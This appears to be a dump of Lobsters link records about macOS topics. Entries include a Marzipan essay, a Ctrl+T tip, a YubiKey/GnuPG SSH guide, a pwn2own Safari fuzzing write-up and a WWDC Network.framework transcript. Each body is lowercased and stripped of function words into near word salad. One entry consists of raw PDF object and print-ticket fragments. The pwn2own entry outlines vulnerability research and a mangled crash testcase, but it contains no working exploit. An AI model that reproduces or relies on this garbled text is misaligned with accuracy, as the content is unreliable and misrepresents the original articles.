objectivec runtime arguable one better think macro good bad price generated code without ability debug quite high sometimes quite good le evil comparing alternative also want mention quite interesting example provided lars wirzenius data type redefined based context used general name provided macro think currently use generic template thing still solution open mind something new add one idea something probably important extend mind maybe next time problem could interpreted differently using new experience completely unrelated tool language know p lot thing worth attention libextc libextobjc check thank reading reference github repository libextc c preprocessor documentation gnu reference objcgetprotocol stringinizing c preprocessor trick implementing similar data type
289,Lobsters,mac,Apple macOS,Marzipan as a Path to ARM Based Macs,http://shapeof.com/archives/2018/6/marzipan_to_arm_on_mac.html,marzipan path arm based mac,mac dead long live mac acorn retrobatch,june jason snell myke hurley upgrade podcast mac dead long live mac apple said merging io macos sneak peek io apps coming macos open lot question mac might look like five year optimistic mac user may biggest change platform since introduction mac o x nearly two decade ago interesting discussion really hope see thing io move mac touch pencil support particular idea folk nt want use touch mac pretty dumb realize apple sell hardware keyboard ipad work exactly way touch mac would couple thing surprised discussion nt cover though follows half baked thought opengl opencl deprecated past year apple ca nt really get rid framework anytime soon legacy apps nt going updated use metal tough spot apple dropped legacy framework easily past though exactly happen cpu change macos went ppc intel macos went bit bit time transition happened apple able say ok legacy stuff nt going new architecture since recompile apps anyway make run new architecture developer kind shrugged said well yea would done made sense see bit intel processor anytime soon facilitate change doubt ok new architecture oh hello bit arm ok got new processor architecture mac need apps recompiled nimble indie shop apps like acorn retrobatch would certainly day one like ppc intel bit got giant like m adobe usually dragged kicking screaming future apple well made easier apps possibly take place least fill gap giant ship something find billion developer already codebase ready compiled another architecture nt decade legacy code clean look angle uikit macos make perfect sense even potentially help transition may actually happen give apple leverage since uikit mac already existed year presently contained io simulator probably big investment apple part think would sure appkit engineer performed heroic make work well like uiview nt already compiling bit intel processor today year ago could go completely rail macos arm ran new uikit apps scary thought macos developer already called io ipad maybe maybe remember half baked thought maybe apple wondering pro user might better served macos touch running arm
290,Lobsters,mac,Apple macOS,The Power of CTRL+T,https://blog.danielisz.org/2018/06/21/the-power-of-ctrlt/,power ctrlt,load cmd ping select packet received min avg max feld,know check process pressing ctrlt happened waiting something finished take lot time easy way check status like dd cp mv many others press ctrlt process running output happening interrupt mess way cause operating system output siginfo signal freebsd look like ping pingtestcom ping pingtestcom data byte byte m byte m byte m byte m byte m load cmd ping select packet received min avg max byte m byte m see output name running command following parameter well pid since process running user time system time cpu usage resident set size process r even better example following cp command cp devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull prcessed ctrlt six time without output would first line another example process changing state wget http http resolving downloadfreebsdorg downloadfreebsdorg connecting downloadfreebsdorg downloadfreebsdorg connected http request sent awaiting ok length applicationoctetstream saving eta cmd wget waiting eta cmd wget waiting eta load cmd wget running eta cmd wget waiting eta bad news ctrlt work linux kernel use macososx fetching distfiles gmp attempting fetch http distfilesmacportsorggmp verifying checksum gmp extracting gmp applying patch gmp configuring gmp load cmd clang running p recall correctly feld showed ctrlt thank
291,Lobsters,mac,Apple macOS,macOS QuickLook Feature Leaks Data Despite Encrypted Drive,https://threatpost.com/macos-quicklook-feature-leaks-data-despite-encrypted-drive/132905/,macos quicklook feature leak data despite encrypted drive,privacy policy,administrator personal data threatpost inc unicorn park woburn detailed information processing personal data found privacy policy addition find message confirming subscription newsletter
292,Lobsters,mac,Apple macOS,"Stick with security: YubiKey, SSH, GnuPG, macOS",https://evilmartians.com/chronicles/stick-with-security-yubikey-ssh-gnupg-macos,stick security yubikey ssh gnupg macos,twofactor authentication widely supported sticky situation universal factor yubico nfc smart card yubico yubikey series stick mac hard drive encryption rsa yubikey already support openpgp openpgp card gnupg homebrew gpg suite homebrew cask website important official guide instruction drduh ssh authentication socket making thing stick atom visual studio code launchd system integrity protection disable stickler detail twitter still stuck openpgp card,learn use usb stick yubico handle authentication project projectrelated tool see go beyond builtin functionality use ssh authentication mac yubikey holding pgp key emulating openpgp gnupg smart card acronym seem background set yubikey yet good place start evil martian growing employee client demand stronger security client trust u source code even importantly access production server trust broken hostile environment modern web though easier said done good old password even coupled password manager cut anymore obvious way increase security opt twofactor authentication widely supported even without hardware key make attacker job much harder used sticky situation enforced across staff tool use daily email github task tracker others default involves requesting onetime access code either smsphone call dedicated smartphone app cellular network however safest place message call intercepted opting app like google authenticator secure also compromised least theory smartphone run precisely targeted attacker better exists open authentication standard aim strengthen simplify known universal factor originally developed yubico google relies physical device usually usb nfc implement cryptographic algorithm chip similar smart card around age probably least pocket phone sim bank card various id like instead confirming access code need insert usb stick computer press physical button device take care rest authenticating already supported major browser notable exception sadly safari use many online service software professional use daily google gmail dropbox github gitlab bitbucket nextcloud facebook list go advantage hardware solution obvious possibility remote attacker gaining access one tool pretty much eliminated attacker need physically get hold usb key still security risk entirely different domain yubikey series family usb device number vendor sell usb key chose yubico yubikey series versatile compact either carried around keychain smaller model stay usb slot laptop time also usbc model newer mac need dongle besides implementing yubikey series support various security standard authenticating online work box linux macos window major browser however want use yubikey ssh connection thing quickly get le straightforward stick mac fair share linux user instruction offer macos replacing default sshagent gpgagent system level macspecific problem mac computer choice u evil martian also use ssh time pushing code github accessing remote server employee work remotely private machine content ssh folder never allowed leak common security measure like hard drive encryption always order yubikeys already used would better store rsa key ssh computer yubikey already support openpgp use openpgp card benefit rsa key put card retrieved programmatically way key written card used combination pin code even yubikey stolen thief would able authenticate directly set yubikey smartcard holding pgp key need first replace sshagent come preinstalled macos gnupg solution easiest way directly terminal homebrew brew install gnupg want install full gpg suite includes gui application run another command requires homebrew cask download website brew cask install gpgsuite time writing recent version gpg let doublecheck sure gpg version gpg gnupg many guide tell install yubikey gpg lot significant change since recommend updating also done caution backup gnupg directory making change important need either generate pgp key directly yubikey create locally copy official guide well evolved instruction github user drduh done need enable ssh client builtin terminal app instance read pgp key directly yubikey time say goodbye builtin sshagent served well insert yubikey holding pgp key computer run following command launch gpgagent instruct application use new ssh authentication socket gpgconf launch gpgagent export sshauthsocket homegnupgsgpgagentssh sshadd l everything went well see private rsa key fact located yubikey unique cardno output sshadd l resemble xxxxxxxxxxxxx rsa congratulation done change persist however soon reload system even switch new console window setup go away let see make permanent making thing stick first thing come mind changing shellrelated setup change local profile bashprofile zshprofile know type shell likely bash come default macos open file editor add gpgconf launch gpgagent export sshauthsocket homegnupgsgpgagentssh every time launch console know ssh properly live shell use vim emacs write code never tempted github visual feature set however use ide one modern text editor integrated github functionality atom visual studio code application concerned shell setup still use system default ssh want since store key securely yubikey dealt gpg need set anything everything worked might say would right macos take care builtin servicemanagement framework called launchd read running man launchd need know launchd deal socalled property list xml file plist extension define service launched launch option located following directory librarylaunchagents peruser agent provided user librarylaunchagents peruser agent provided administrator librarylaunchdaemons systemwide daemon provided administrator systemlibrarylaunchagents peruser agent provided macos systemlibrarylaunchdaemons systemwide daemon provided macos let digging look anything sshrelated right systemlibrarylaunchagentscomopensshsshagentplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string comopensshsshagent string key programarguments key array string usrbinsshagent string string l string array key socket key dict key listener key dict key securesocketwithkey key string sshauthsock string dict dict key enabletransactions key true dict plist without diving much detail see macos make sshagent default utility ssh authentication unfortunately edit file directly anything located system folder protected tampering macos feature called system integrity protection way disable want apple folk came reason stickler detail nothing prevents u writing plist though xmls treated instruction launchd chance circumvent sshagent first let read man gpgagent learn gnupg agent mac capable become daemon live background daemon option supervised option designed systemd make gpgagent wait certain set socket access file descriptor server option allows agent hook onto tty listen text input without opening socket unfortunately launchd track process run foreground neither supervised server u good best way launch agent using command used gpgconf launch gpgagent let express launchdcompatible xml xml version encoding doctype plist public appledtd plist http plist version dict set name task key label key string homebrewgpggpgagent string set command run option key programarguments key array string usrlocalbingpgconf string string launch string string gpgagent string array tell run task xml loaded key runatload key true dict plist save homebrewgpggpgagentplist put librarylaunchagents folder test work restart tell launchd load new plist launchctl load f librarylaunchagentshomebrewgpggpgagentplist let make sure agent loaded launchctl list grep gpgagent homebrewgpggpgagent pgrep fl gpgagent gpgagent homedir usersexamplegnupg usestandardsocket daemon digit launchctl list output show exit status launched program want see pgrep confirms fact running however done yet still need point sshauthsock environment variable homegnupgsgpgagentssh problem variable already set userwide launchd default setting sshagent moment nothing better mind following hack forcibly symlink gpgagent socket default one stored sshauthsock variable power unix allows u effectively mess default ssh configuration however using gnupg everything sshrelated problem better idea please contact twitter create another plist necessary symlinking login xml version encoding doctype plist public appledtd plist http plist version dict key label key string linksshauthsock string key programarguments key array string binsh string string c string string binln sf homegnupgsgpgagentssh sshauthsock string array key runatload key true dict plist trick call shell directly binsh reference shell variable pas command save file librarylaunchagentslinksshauthsockplist load launchd launchctl load f librarylaunchangentslinksshauthsockplist let test result launchctl list grep linksshauthsock linksshauthsock l lah sshauthsock lrwxrxrx example wheel mar privatetmpcomapplelaunchdxxxxxxxlisteners usersexamplegnupgsgpgagentssh bingo macos effectively tricked thinking deal sshagent even though gpgagent authenticating reading pgp key directly yubikey need know authenticate ssh true hardware fashion turn laptop put stick usb push button mac completely secure still stuck another problem may encounter start using yubikey opengpg card gpgagent sometimes get stuck look like yubikey connected replugging also nothing known problem discussed observation show appears put laptop sleep let deal first need tool keep track laptop wake sleepwatcher made install homebrew brew install sleepwatcher default expects two script sleep run computer go sleep wakeup run wake let create minimal sleep script look like need sure pass shell script binbash exit wakeup forcibly restart gpgagent binbash usrbinpkill gpgagent usrlocalbingpgconf launch gpgagent exit need add execution flag enable sleepwatcher service chmod ax sleep wakeup brew service start sleepwatcher thank reading article showed set ssh authentication flow yubikey openpgp card make gpgagent play nicely macos need access server push code remote repository insert stick usb enter pin code requested passphrases longer required
293,Lobsters,mac,Apple macOS,Inside the Mac OS X Kernel (2007),https://events.ccc.de/congress/2007/Fahrplan/attachments/1053_inside-macosx-kernel.pdf,inside mac o x kernel,,obj length r filter flatedecode stream gbbdb ic endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text imageb imagec imagei colorspace r r font r xobject r r endobj obj length r type xobject subtype image width height colorspace r interpolate true intent perceptual bitspercomponent filter dctdecode stream jfif h h mm b j h h adobe photoshop c macintosh h h jfif h h adobecm adobe x mkj c mkj c mkj c mkj c mkj ķ ķ j comappleprintpageformatpmhorizontalres comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmhorizontalres comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmorientation comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmorientation comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmscaling comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmscaling comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmverticalres comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmverticalres comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmverticalscaling comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmverticalscaling comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintsubticketpaperinfoticket comappleprintpageformatpmadjustedpagerect comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmadjustedpagerect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmadjustedpaperrect comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmadjustedpaperrect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmpapername comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmpapername naletter comappleprintticketclient comappleprintpmpostscript comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmunadjustedpagerect comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmunadjustedpagerect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmunadjustedpaperrect comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmunadjustedpaperrect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfoppdpmpapername comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfoppdpmpapername u letter comappleprintticketclient comappleprintpmpostscript comappleprintticketmoddate comappleprintticketstateflag comappleprintticketapiversion comappleprintticketprivatelock comappleprinttickettype comappleprintpaperinfoticket comappleprintticketapiversion comappleprintticketprivatelock comappleprinttickettype comappleprintpageformatticket x h h h h h h h
295,Lobsters,mac,Apple macOS,pwn2own 2018: Vulnerability Discovery Against Apple Safari,https://blog.ret2.io/2018/06/13/pwn2own-2018-vulnerability-discovery/,vulnerability discovery apple safari,exploit development safari part one reconnaissance documentation security literature spidermonkey chakra webkit zeroing target webkit highly exploitable evaluation strategy grammar based fuzzing grammar spec synthesizing javascript grammar dharma jsarray scalable fuzzing harness coverage abstract corpus dynamorio lcov lighthouse vulnerability discovery conclusion,vulnerability discovery first stage exploit development lifecycle duration phase openended search space code quality evaluation process given target vary wildly deciding manual automated vulnerability discovery often question priority difficult balance effectively part two blogpost series discus methodology researching complex software target safari web browser narrowing scope evaluation selecting vulnerability discovery strategy developing browser fuzzer unique engagement snippet javascript testcase generated grammar based j fuzzer toplevel discussion blog series entire exploitchain check part one reconnaissance faced million line code discovering vulnerability largescale software overwhelming experience overcome vital build foundational knowledge target one leastglamorous part zeroday development process basic reconnaissance software user interact software project architected major component past vulnerability look like step literally come aggregating documentation security literature relevant target spending time pore build list link take note try understand everything real world exploitation often prefaced exhaustive research existing resource public research documentation explicit target useful review material related target eg spidermonkey chakra etc device attacking hardware skipping step simply mean spend longer making discovery already distilled resource webkit zeroing target dealing smalltomedium sized target often feasible simply target becomes exponentially harder targeting codebases grow size complexity using knowledge learned study existing literature recon important aggressively reduce scope believe worthwhile evaluate left manageable amount attacksurface applied strategy limit intended scope evaluation webkit million line cc le limiting breadth hope increase depth quality evaluation perform targeted subset codebase treemap visualization webkit source directory generated understand scitools chose focus specifically javascriptcore j engine within safari decision informed one based reviewing existing research bug j engine becoming increasingly rare highly exploitable nature vulnerability hard pine selecting javascriptcore huge reduction scope even jsc sizable line cc help familiarize codebase chose contract scope code treemap visualization javascriptcore source directory javascript runtime highlighted red cc code make j runtime highlighted red map almost directly high level object used writing javascript runtime effectively surface layer j engine high level layer life mostly sourcejavascriptcoreruntime javascriptcore runtime directory tinted red previous picture scoped runtime folder line code figure still pretty substantial reduced scope shaped approachable task considered depend resource time money people discovery strategy plan employ selected target time select approach towards vulnerability discovery evaluation strategy two distinct method effective software security evaluation picking naively one individual preference otherwise choice driven underlying priority motivation fuzzing goto strategy many security enthusiast often low cost fruitful fuzzers cover large amount attack surface small amount time cost depth human provide quickly finding bug fuzzer feel rewarding also red flag someone else found thing bug often shorter shelf life source review tedious demoralizing well vetted code persist often lead deeply rooted bug reach fuzzers even fellow reviewer bug tend longer lasting frequently used trade engagement made sense u use fuzzing heavy approach layer scoped jsc ambitious target heavily picked year shallow among vetted code webkit fuzzers source reviewer alike bug found area unlikely last longterm climate remainder post detail approach consideration weighed building j fuzzer grammar based fuzzing classic fuzzing technique bitflipping simple input mutation testcasesplicing generally unusable highly structured contextual input like interpreted language javascript fuzz input best approach synthesize syntactically correct semantically reasonable testcases using grammar practically speaking grammar often handwritten analyst set structuring data example write simple grammar generate math expression digit operator using primitive build new higher level grammar structure math expression expr digit operator digit concretize concept ask testcase generator consume grammar rule wrote produce arbitrary number random expr output idea extrapolated much complex task generating syntactically valid javascript code boil reading spec translating grammar definition synthesizing javascript grammar j testcase generation powered grammar pushed custom version dharma extended include convenience method allowed u generate code supplied eg wrote two category j grammar dharma library driver library grammar served three major purpose defining rule initialize particular javascript object type array string map etc defining rule generate valid member function object type eg arraysort defining collection syntactically semantically similar rule driver grammar provided highlevel scaffolding library grammar typically driver grammar would first initialize set distinct javascript variable using rule previously defined library following generated randomized construct forced interaction javascript variable modified deleted reinitialized variable random point called appropriate member function variable based type collection allowed u express highlevel driver grammar example look collection wrote jsarray object callbackmethod every filter reduce inplacemethod sort splice shift wanted array randomly modify one many way occassion could include single jsarray inplacemethod statement whatever larger grammar construct building without collection would manually specify individual possibility entry collection would generate randomly chosen signature particular member function api potentially firing generation javascript construct necessary sort sort sort genericfunc twoargnumericcmp gave u flexibility vague writing driver grammar provide rough boundary testcasegeneration let chance dictate happened ended majority fuzzing using one grammar would initialize variable every library grammar wrote chaotically generate action snippet testcase generated chaotic megadriver grammar originally grammar intended would collect code coverage improve underlying library grammar plan later build interesting context state driver grammar good coverage runtime functionality ended happening found exploitable issue building library grammar scalable fuzzing harness building j grammar better testcase generation developed yetanotherdistributedandscalablefuzzingharness python tradition harness infrastructure architected use single node arbitrary number node master node responsible managing configuration triaging worker reported crash testcases bucket consolidating codecoverage metric collected worker consequently responsibility included testcase generation launching testcases jsc reporting crash collecting codecoverage data random sampling testcases view fuzzer dashboard available master node fuzzed worker node debug build jsc compiled asan running ubuntu made special modification javascriptcore codebase purpose engagement coverage abstract corpus small percentage time harness would use dynamorio collect code coverage random sampling jsc execution harness would aggregate code coverage information rough approximation corpus j grammar capable generating jsc master node automatically generated exposed lcov report dashboard get quick visual approximation overall code coverage report would update every minute aggregating new coverage data worker making convenient track grammar improvement real time viewing lcov report jsc generated master fuzzer node occasion would also download explore running coverage aggregate using lighthouse harness explicitly collected coverage release build jsc compile time optimization inlining disabled cleaner view disassembler exploring latest jsc code coverage aggregate using lighthouse although may seem counterintuitive evaluate coverage assembly level source available getting advantage tricky edge case natural disassembler lighthouse much interactive static html report generated lcov lighthouse give u detailed function level property coverage statistic sort prioritize c templated code one source implementation many binary function could emitted combination tooling gave u valuable insight towards tuning grammar ensure coverage edgecases nonstandard mode operation notable execution gap within jsc runtime hoped use coverage augment guide manual source review got thing rolling mentioned grammar section cut short premature discovery vulnerability discovery grammar began surpass code coverage scoped target runtime folder began see number unique crash uncommon fuzzing complemented good coverage visibility targeting code coverage hard fought final percentage point edge case uncommon code bug often shake triaged new crash noticed one particularly intriguing callstack wtfcrashwithsecurityimplication catch eye security researcher minimizing crashing testcase left following proofofconcept poc initialize jsarray jsarrays var array var var index index index async function cval cindex carray carrayreverse print array content debug info var print print tostring print describearray script pocjs would intermittently demonstrate abnormal behavior believed responsible original jsc crash caught fuzzing harness running testcase jsc time observe unexplainable phenomenon number jspromise object randomly get stored within testing minimized poc debug build jsc never happen ever contain jsarrays created first step minimized testcase something wrong happening conclusion evaluating sufficiently large piece software security vulnerability inherently difficult undertaking post discussed strategy research target reduce scope apply custom tooling essential method managing intrinsic complexity process next blogpost detail use advanced debugging technology perform root cause analysis rca suspicious testcase minimized jsc bug based understanding underlying issue draw informed conclusion true security implication
296,Lobsters,mac,Apple macOS,Introducing Network.framework: A modern alternative to Sockets - WWDC 2018,https://developer.apple.com/videos/play/wwdc2018/715/,introducing networkframework modern alternative socket wwdc,,download good morningmy name josh graessley really excited morning tell networkframeworknetworkframework modern alternative socketstoday going talk modernization transport apis help give context understand networkframework fit system whether right thing application usingwe introduce api walking making first connectionswe talk use api really optimize data transfer go way beyond performance anything socketswe talk api help handle complex mobility challenge wrap information get involved start adoptingfirst like spend little bit time talking modernizing transport apisnow say transport api talking api let send receive arbitrary data two endpoint network pretty broad definition lot apis could fall categoryperhaps ubiquitous socket socket within u year nt think exaggeration say socket changed world world kept changingand consequence using socket write apps today internet really hardthere three primary area difficult use socket wellthe first one connection establishmentthere whole host reason establishing connection really difficult socketsfor starter socket connect address time host name going resolve host name address often end way one address address address got challenge address try connect order long wait try next one spend year trying perfect thisi know haveonce get past dual stack host problem run whole bunch issuesthere network use something called proxy automatic configuration pacon network javascript get pas url javascript javascript run spit answer say either go direct use sock proxy http connect proxy thereand app support sock proxy http connect proxy really difficult welland difficult thing may one network test may get bug report one customer may complain working well environmentand may want add code fix problem got really nt good way test end building whole environment reproduce environment haveit real challengeso connecting socket really hardthe second thing becomes challenge socket data transfersthere lot reason transferring data socket really difficultthe primary problem read write model using blocking socket pretty simple tying thread really great idea tying thread waiting read write datayou switch nonblocking end whole lot challenge run intowhen using nonblocking may tell kernel like byte kernel come back say got byte nt come back laterand build state machine keep track many byte read versus many byte want readthis lot work getting perform well real challengeon top really nt reading writing socket directly using something like transport layer security tlssockets nt support tl probably using library handling tl reading writing socket behalf writing glue code library socket figure get work crazy connection logic put ahead timethere lot really difficultfinally mobility really challenge socket variety reasonsi think lot boil fact socket came lot device required single person move connected single wire static ip address everything stable simpleand today incredibly powerful device pocket multiple radio may time moving network network application handle transition well provide seamless experience customerssockets nothing help thisyou use routing socket really really difficultwe think transport api betterfortunately platform application developer great api urlsessionurlsession handle problem youit really focused http also stream task give raw access tcp tl connectionsnow might looking may cheated looking description wwdc appyou might think urlsession built primitive would use yourselfbut turn case urlsession built top something call networkframeworkurlsession really focus http bit offloads lot transport functionality networkframeworknetworkframework something working number year supporting urlsession learned lot taken lot lesson ietf number engineer regularly participate ietf meet engineer company discussing lot learned transport service working groupand discussion got great feedback brought back improved networkframework based thatwe really excited announce year application take advantage library directly nownow know one thing people love socket give finegrain control everything really loathe give developed networkframework wanted make sure right thing default way socket nt gave knob socket doesand kind got gradient knob turn complex becomesit give power need nt pay complexity unless actually need itnetworkframework incredibly smart connection establishmentit handle dual stack case handle network handle pac handle proxiesit help connect network otherwise difficult deal withit incredibly optimized data transfer path let go way beyond performance anything socket tommy cover little bitit support builtin securityit support tl dtls defaultit really simple useit great support mobility provides notification network change relevant connection application establishingit available io macos tvos capi automatic reference counting easy use objective c incredible swift apiwith like turn tommy pauly walk making first connectionthank youall right hello everyonemy name tommy pauly networking team appleand sure lot really excited start seeing start adopting networkframework appsand best place start dive right making first connection going making connection local device server peer device local networkbut may wondering kind connection appropriate use networkframeworkwhat use case let explore first scenario apps may using socket today would really benefit lot taking advantage networkframework going forwardso first one want highlight gaming appsgaming apps often use udp send realtime data game state one device anotherand really care optimizing latency making sure lag anything dropped thereif app like going love networkframework allows really optimize udp sending receiving faster ever least latency possibleanother type app would take lot advantage networkframework livestreaming appsso live streaming often use combination udp tcp apps key point generating data fly new video frame audio frame need make sure paced well incurring lot buffering device networkthe asynchronous model reading writing networkframework going perfect making sure reduce bufferingand last case want highlight mail messaging appsso going using lot traditional protocol tl tcphowever really critical apps like handle network transition really gracefullyoftentimes messaging app user going using app walking building texting friend let know wayand want make sure handling transition wifi network building cell network going onto nt hand long time message actually get friendand three example type apps may use lowlevel networking like thisthere many type apps could take advantage app like one use case currently us socket invite follow along see app benefit get started want focus last case simplest case mail messaging apps looking establish connectionsso want establish connection server let say mail connection imap security tl start hostname mailexamplecomyou port want connect port want using tl well tcp would look socket traditionally something like get startedyou would take host nameyou would call dns api resolve host namelet say getaddrinfoyou get back one addressesyou decide one want connect firstyou call socket appropriate address familyyou set series socket optionslet say want make socket nonblocking like josh mentioned beforethen call connect start tcp wait writable eventand anything tl whole host problemsso look networkframework hope look familiar little bit simplerso first thing create connect connection objectand connection object based two thingsyou endpoint defines destination want get could address ip address usually like example host name port end point host name portit could also bonjour service want connect toand also parametersparameters define protocol want use tl dtls udp tcp defines protocol option want well path want use connect overdo want connect anything want use wifi configured connection simply call start get thing going wait connection move ready stateand need bring full tl connection serverand think going love look swiftso doyou first import network modulethen create nwconnection objectso nwconnection either swift c fundamental object reading writing datain case convenience initializes endpoint host port give hostname maleexamplecom port case wellknown portit imaps put swift easy could also put numeric literal thereand define protocol want use pas parameter since client connection want default tl tcp parametersit simple writing dot tl fullyfledged tl connectionthe next thing said estate update handler handle transition connection might go throughthe first state important one want handle ready stateready mean app ready read write data connection totally established using tcp tl mean tl handshake finishedwe also though let know waiting stateso last year urlsession introduced wait connectivity waiting state nwconnection exactly thingand always defaultso create connection start network available wo nt fail tell waiting network available give helpful reason code nt anything watch network transition yourselfmobility essential critical part apiand also let know fatal error let say reset server tl failed give failed eventso set simply call start provide dispatch queue upon want receive callback want dig happens call start actually going little state machine innards nwconnection begin setup state call start move preparing stateso preparing state lot calling connect tcp socketfor tcp socket would send syn packet across server trying reachbut call start nwconnection actually handle thing josh mentioning earlierit evaluates network try make fastest connection possible want dig little bit moreso call smart connection establishmentso first thing call start take endpoint evaluate network currently available mein case wifi cellularand generally prefer wifi network le cost userso look one firstthen check special configuration networkis vpn proxy evaluate youin case let say proxy configured automatic configuration file also let go direct proxy nt apply connectionso evaluate optionswe check need use proxy go ahead connect create tcp connection therebut nt need dns behalf going directly get back dns ip address answer connect one leaving going parallel racing get fastest connection possibleand something go wrong wifi let say wifi radio quality go really bad walking away building actually take advantage feature called wifi assist fall back seamlessly cellular network dns resolution try connection one way connection establishment resilient handle vpns handle proxy get best connection possible course may want try option may want restrict connection establishment many different knob control let want highlight three todaythe first may want use expensive network like cellular network connection appropriate use wifiso within parameter connection option control interface useso nt want use cellular simply add cellular list prohibited interface typesit even better actually also prohibit expensive network general also block usage personal hotspot mac let sayanother way restrict connection establishment choosing specifically ip address family want useso let say really love faster futureyou nt want use connectionand going parameter digging ipspecific option option find familiar socket option socket today also define specifically ip version want useand impact connection well dns resolutionand lastly may want use proxy given connection maybe appropriate connection go sock proxyin case simply prohibit use proxy wellso happens preparing statei mentioned thing go wrong network try establish going preparing find good option dns failed network maybe airplane mode move waiting state let know reason thatand keep going back preparing every time network change system think yeah good chance connection become established handle let know every time reattemptingeventually hopefully connection get establishedat point move ready stateand ready state mentioned connection fully established protocol stack tl exampleat point read write also give callback network transition going throughso connection established change network give update handle mobility gracefully talking later talkif error connection either connection establishment already connected give failed state error totally done connection let say already closed received close side want invalidate connection call cancel move cancelled state guaranteed last event deliver object clean memory associated move onso overview basic lifetime connection object networkframework show use build simple app like invite eric stagethanks tommyi eric kinnear also networking team apple really excited build example application using networkframeworkwe going use live streaming example tommy mentioned earlier build application take camera input one device send network displayed another devicebecause going continuously generating live video frame going use udp send packet across networkso well first need capture session camera receive video frame image sensorfor sake example going use video codecs compressionwe simply going take raw byte camera ship across network display sidein order make happen need divvy frame smaller chunk send udp packetsof course send udp packet network need connection switching device need listener receive incoming connection read data packet networkfrom simply reverse earlier process reassembling video frame sending display see screento keep thing simple already abstracted camera display functionality focus part use networkframeworkthere one piece nt yet covered listenerso going take minute nowlistener functionality provided nwlistener class create using parameter object used configure connectionsit really easy set listener advertise bonjour servicein case use cameraudp new connection received listener pas connection block provide newconnectionhandlerthis opportunity perform configuration choose connection need call start let connection know time get going similarly need call start listener like connection provide dispatch queue want callback scheduledso listenersif think implemented equivalent calling listen udp socketexcept listen nt actually work udp socket ready build app xcodeso got application got bunch file already handle camera display functionality going focus udpclient class udpserver classthe udpclient going responsible creating connection side sending frame acrosslikewise server responsible creating listener accepting incoming connection reading data connection sending screenlet start client client class initializer take name string describing bonjour name want connect create connection simply calling nwconnection passing service endpointusing name provided cameraudp type also passed default udp parametersas tommy mentioned use state update handler check ready failed stateshere connection ready call sendinitialframe implement minute using udp handshake going take data send across network device wait echoed back start generating lot video frame dumping networkwe need remember call start connection provide queue created let implement send initial framehere going take literal byte hello create data object using send content connection call connectionsend provide data object contentwe provide completion handler check error may encountered sendingsince expect content immediately echoed back turn right around call connectionreceive read incoming data connectionin completion handler validate content present let rest application know connected bring camera hardware start generating frameswhen frame generated rest application know call send udpclient class pas array data object representing video frame trying send going lot send operation quick succession going within block passed connectionbatch within block going go every frame array data object pas one connectionsendsimilarly use completion handler check error encountered sendingand itwe got udpclient class ready go let look serveron server side need listener accept incoming connectionswe need respond handshake sent client need read data network push displaystarting listener simply create nwlistener using default udp parametersif wanted also opportunity use parameter tell listener listen specific local portbut since using bonjour service nt need thatto set service going set service property listener service object type cameraudpnotice nt pas name want system provide default device name mei also provide block serviceregistration updatehandler going called anytime set endpoint advertised system changeshere interested case endpoint added service type tell rest application name advertised default device name ask system provide display ui user type somewhere elsei going set new connection handler listener called every time listener receives new incoming connection could configuration connection default setting fine simply call connectionstart pas queue notify rest application received incoming connection start warming display pipeline become ready display video framesi also call receive implement minute start reading data network shipping display pipeline like connection listener state update handler use check ready failed statesi need forget start listener calling listenerstart passing queue created aboveso got listener ready need read data network implement receive functionhere start calling connectionreceive passing completion handlerwhen data come connection see yet connectedif nt connected probably handshake client starting sending simply turn right around call connectionsend passing content back echoed clientwe remember connected subsequent received callback simply tell rest application received frame send display pipeline see screen finally error call receive receive subsequent frame send display book together video individual imagesso got udpclient got udpserver let try outi going run client phone going run server mac see big screenhere server came see advertising demo mac told rest system give namethat phone tap connect sudden see video frame streamed across network udp liveso saw quickly able bring udpclient could connect bonjour service send handshake wait processed take video frame coming camera ship across networkthe server side brought bonjour listenerit advertised service received incoming connection responded handshake sent display could see themand take optimizing data transfer little detail like invite tommy back stagethank ericit really cool demo super easy get going covered basic know establish connection outbound receive connection inbound real key part networkframework going killer feature way optimize performance go beyond socket able doand want start way application interact networking connection basic way sending receiving dataand call simple nuance handle sending receiving really make huge difference responsiveness app much buffering going device networkso first example want walk sending data application much like eric showed something live streaming something generating data flybut case let talk sending tcp stream tcp stream back network certain window sendso handle function send single frame frame data application generatedand way send connection simply call connectionsend pas datanow used using socket send connection either using blocking socket case hundred byte data send room send buffer actually block thread wait network connection drain using nonblocking socket send may actually send complete data say oh sent byte come back time send next bytesthis requires application handle lot state much actually done sending dataso great thing network connection simply send data nt worry nt block anythingbut course handle happens connection backing nt want send ton data unnecessarily connection want really responsive live stream dataand key callback block give youit called contentprocessedand invoke whenever network stack consumes dataso nt mean data necessarily sent acknowledged sideit exactly equivalent time blocking socket 